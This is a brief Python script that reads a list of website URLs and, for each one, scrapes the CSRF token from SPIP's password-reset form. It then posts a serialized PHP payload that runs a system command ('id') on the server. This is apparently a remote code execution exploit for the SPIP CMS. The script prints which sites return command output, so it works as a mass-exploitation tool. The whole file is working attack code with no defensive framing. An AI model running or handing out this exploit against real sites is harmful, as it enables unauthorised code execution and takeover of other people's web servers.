import requests
import bs4
import os

os.chdir('/sdcard')

requests.packages.urllib3.disable_warnings()


try :
	url = open('vuln.txt', 'r')
	for x in url :
		strip = x.strip()
		r = requests.get(strip+'/spip.php?page=spip_pass')
		soup = bs4.BeautifulSoup(r.text, 'html.parser')
		csrf = soup.find('input', {'name': 'formulaire_action_args'})
		
		if csrf:
		      csrf_value = csrf['value']
		      payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len('id'), 'id')
		      data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf_value,
        "oubli": payload}
		      r = requests.post(strip+'/spip.php?page=spip_pass' ,data=data)
		      var = r.text
		      soup1 = bs4.BeautifulSoup(var, 'html.parser')
		      csrf1 = soup1.find_all('input')
		      cs = str(list(csrf1)[3])
		      if 'uid' in cs :
		       	soup_sep= bs4.BeautifulSoup(cs, 'html.parser')
		       	separe=soup_sep.find('input')
		       	sep_gid='uid='+separe['uid']
		       	print("\033[1;33m"+r.url)
		       	print("\033[1;32m"+"Output | "+sep_gid+'\n')
	
	
except requests.exceptions.MissingSchema:
	print('')

